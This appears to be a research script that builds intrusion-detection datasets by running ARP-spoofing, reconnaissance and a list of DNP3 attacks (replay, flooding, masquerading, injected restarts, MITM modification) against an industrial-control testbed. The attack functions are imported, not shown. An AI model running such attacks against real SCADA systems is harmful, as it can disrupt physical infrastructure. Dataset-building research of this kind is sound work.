__author__ = 'Nicholas Rodofile'

from attack_functions import *


local = "dataset/"
interface = 'eth0'
directory = local + str(datetime.now().strftime("%Y%m%d%H%M%S"))
os.makedirs(directory)

subprocess.call("./networkrestart_attacker.sh")

minute = 60
hour = (60 * minute)
service_time = 1.0 * minute

log = []
sub_log = []

def timestamp_log(log_msg):
    log_item = str(datetime.now()) + " " +log_msg
    print log_item
    log.append(log_item)
    sub_log.append(log_item)


def run_attack(_victim, _gateway, attack):
    timestamp_log(attack.__name__ + " " + _victim.ip_address + " " + _gateway.ip_address + " START")
    attack(_victim, _gateway)
    timestamp_log(attack.__name__ + " " + _victim.ip_address + " " + _gateway.ip_address + " END")

def reconnaissance(gateway, victim, nodes, mitm):
    DNP3_nodes_found = []
    for n in nodes.keys():
        if nodes[n].status == "open":
            mitm.victim = nodes[n]
            mitm.init_spoofing()
            timestamp_log("reconnaissance" + " " + nodes[n].ip_address + " START")
            master = DNP3_Reconnaissance(nodes[n], dnp3_port)
            DNP = master.start()
            DNP3_nodes_found.append(DNP), "Address discovery"
            timestamp_log("reconnaissance" + " " + nodes[n].ip_address + " END")
        else:
            print n, "port closed"
        #scan_countdown(10)
    print "--------------- DNP3 Nodes Found ----------------"
    print "#################################################"
    if len(DNP3_nodes_found) == 0:
        print "No DNP3 Nodes"
    for n_d in DNP3_nodes_found:
        print n_d["IP"], ": Master:", n_d["master"], " Slave:", n_d["slave"]
    print "#################################################"

replay_file = 'mitm/replay_20160225_1634.pcap'
mst_replay_file = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'
mst_replay_file2 = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'


#DNP3_Slave_Object_Spoof

datasets = [
    "testing", "training"
]
num_attacks = 4
frequencies = {
    "infrequent": {
        "attacks": num_attacks,
        "min_time": 5,
        "max_time": 5,
    },

    "frequent": {
        "attacks": num_attacks,
        "min_time": 5,
        "max_time": 5,
    },
}

attack_class_names = [
    "MITM",
    "replay",
    "flooding",
    "masquerading",
    "injection",
    "attacks"
]
attack_classes = {

    "injection": [
        injection_replay,
        injection_replay_updater_ack,
        injection_FreezeObj,
        injection_ColdRestart,
        injection_WarmRestart,
        injection_push,
    ],
    "masquerading": [
        master_masquerading,
        slave_masquerading,
        slave_masquerading_flooding,
        slave_masquerading_Object_Spoof_Binary,
        slave_masquerading_Object_Spoof_Counter,
        slave_masquerading_Object_Spoof_Binary_fuzz,
        slave_masquerading_Object_Spoof_Counter_fuzz
    ],
    "flooding": [
        master_flooding,
        slave_masquerading_flooding,
        master_replay_flooding,
        master_hijacking_with_replay_flooding,
        master_flooding_freeze,
        master_flooding_time,
    ],
    "replay": [
        master_replay,
        master_replay_flooding,
        master_hijacking_with_replay,
    ],

    "MITM": [
        MITM_forwarding,
        MITM_hijack_injection,
        MITM_modification_length_overflow,
        MITM_modification_IMMED_FREEZE_NR,
        MITM_modification_BinaryStatus,
        MITM_modification_CounterStatus,
    ],
    "attacks": [
        injection_replay,
        injection_replay_updater_ack,
        injection_FreezeObj,
        injection_ColdRestart,
        injection_WarmRestart,
        injection_push,
        master_hijacking_with_replay,
        master_hijacking_with_replay_flooding,
        slave_masquerading,
        master_masquerading,
        master_flooding,
        master_flooding_freeze,
        master_flooding_time,
        master_replay,
        master_replay_flooding,
        slave_replay,
        slave_masquerading_flooding,
        slave_masquerading_Object_Spoof_Binary,
        slave_masquerading_Object_Spoof_Counter,
        slave_masquerading_Object_Spoof_Binary_fuzz,
        slave_masquerading_Object_Spoof_Counter_fuzz,
        MITM_forwarding,
        MITM_hijack_injection,
        MITM_modification_length_overflow,
        MITM_modification_IMMED_FREEZE_NR,
        MITM_modification_BinaryStatus,
        MITM_modification_CounterStatus,
    ]
}


verbose = 1
pkt_count = 100

interfaces = {
    'attacker': "eth0",
    'master': "eth1",
    'slave': "eth2"
}

print "Dataset:", directory
print "Datasets Types"
for d in datasets:
    print "\t-", d

print "Datasets Frequencies"
for f in frequencies:
    print "\t-", f
    print "\t\t-- attacks:", frequencies[f]["attacks"]
    print "\t\t-- min_time:", frequencies[f]["min_time"]
    print "\t\t-- max_time:", frequencies[f]["max_time"]

print "Attack Classes"
for ac in attack_class_names:
    print "\t-", ac
    for a in attack_classes[ac]:
        print "\t\t--", a.__name__


gateway, victim, nodes = config_nodes_all(interface=interface, port="20000", init_nodes_func=init_dnp3_nodes)
mitm = DNP3_MITM(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)
mitm.init_spoofing()


count = 0
udp = UDP_Server(gateway, 23, 0)
udp_mask = Thread(target=udp.start)
udp_mask.daemon = True
udp_mask.start()

for attack_class in attack_class_names:
    attack_class_dir = directory+"/"+attack_class
    os.makedirs(attack_class_dir)
    print "--", attack_class
    for dataset in datasets:
        attack_class_ds_dir = attack_class_dir+"/"+dataset
        os.makedirs(attack_class_ds_dir)
        print "----", dataset
        for frequency in frequencies:
            frequency_attack_class_dir = attack_class_ds_dir+"/"+frequency
            os.makedirs(frequency_attack_class_dir)
            print "------", frequency
            count += 1

            attack_list = attack_classes[attack_class]
            attack_count = frequencies[frequency]['attacks']
            min_time = frequencies[frequency]['min_time']
            max_time = frequencies[frequency]['max_time']

            experiment_name = "Dataset"
            dataset_manager = DatasetManager(frequency_attack_class_dir, interfaces, experiment_name)
            dataset_manager.start()
            # Randomise time
            #attack_countdown(randint(min_time, max_time)*minute)
            reconnaissance(gateway, victim, nodes, mitm)
            #attack_countdown(randint(min_time, max_time)*minute)

            for i in range(0, attack_count):
                if i != attack_count:
                    sleep_time = (randint(min_time, max_time))
                    attack_countdown(sleep_time * minute)
                shuffle(attack_list)
                attack = attack_list[randint(0, (len(attack_list)-1))]
                run_attack(victim, gateway, attack)

            dataset_manager.stop()
            sub_log_file = frequency_attack_class_dir+"/Attack_script_log.log"
            file = open(sub_log_file, 'w')
            for l in sub_log:
                file.write(l + "\n")
            file.close()
            print "Sub-Log file:", sub_log_file
            sub_log = []

UDP_SERVER_STOP = True
log_file = directory+"/Attack_script_log.log"
file = open(log_file, 'w')
for l in log:
    file.write(l + "\n")
file.close()

print "Log file:", log_file
